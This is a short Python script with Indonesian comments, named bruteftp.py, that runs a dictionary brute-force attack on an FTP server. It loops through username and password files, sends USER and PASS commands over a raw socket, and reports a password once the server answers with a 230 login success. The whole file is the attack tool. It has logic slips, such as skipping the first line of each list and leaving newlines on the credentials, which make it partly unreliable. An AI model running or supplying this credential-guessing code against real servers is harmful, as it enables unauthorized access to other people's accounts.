'''
Serangan brute force ftp sederhana menggunakan file kamus untuk nama pengguna dan kata sandi
    Nama file: bruteftp.py
    Penulis: Dunia MR
    Tanggal dibuat: 15/03/2024
    Versi: 1.0.0.1
'''
import re
import sys
import socket
import argparse
from ipaddress import ip_address

def get_args():
    parser = argparse.ArgumentParser(description='Process arguments')
    parser.add_argument("-v", "--version", help="0.1", action="store_true")
    parser.add_argument('-d', '--debug', help='Meningkatkan kejelasan untuk memudahkan proses debugging', action="store_true")
    parser.add_argument('-s',"--server", type=ip_address, help='alamat untuk digunakan', required=True)
    parser.add_argument('-p','--port', nargs='?', default="21",type=int)
    parser.add_argument('-u', '--usernames', metavar='FILE_NAMA_PENGGUNA', help='file nama pengguna',required=True);
    parser.add_argument('-pass', '--passwords', metavar='FILE_KATA_SANDI', help='file kata sandi',required=True);
    args = parser.parse_args()
    version = args.version
    debug = args.debug
    server = args.server
    port = args.port
    usernames_file = args.usernames
    passwords_file = args.passwords
    return version, debug, server, port, usernames_file, passwords_file

def connect(username,password,server,port,v=False):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if debug:
        print ("[*] Mencoba {} : {}".format(username,password))
    s.connect((str(server),port))
    data = s.recv(1024)
    s.send(('USER '+ username + '\r\n').encode())
    data = s.recv(1024)
    s.send(('PASS ' + password + '\r\n').encode())
    data = s.recv(3)
    s.send(('QUIT\r\n').encode())
    s.close()
    return data

version, debug, server, port, usernames_file, passwords_file  = get_args()

if server and port and usernames_file and passwords_file:
    with open(usernames_file) as fu:
        username = fu.readline()
        cnt = 1
        while username:
            if debug:
                print("Username {}: {}".format(cnt, username.strip()))
            username = fu.readline()
            cnt += 1
            with open(passwords_file) as fp:
                password = fp.readline()
                pcnt = 1
                while password:
                    print("Password {}: {}".format(pcnt, password.strip()))
                    password = fp.readline()
                    pcnt += 1
                    attempt = connect(username, password, server, port, debug)
                    if attempt == b'230':
                        print ("[*] Kata sandi ditemukan: {} -> ".format(password))
                        sys.exit(0)
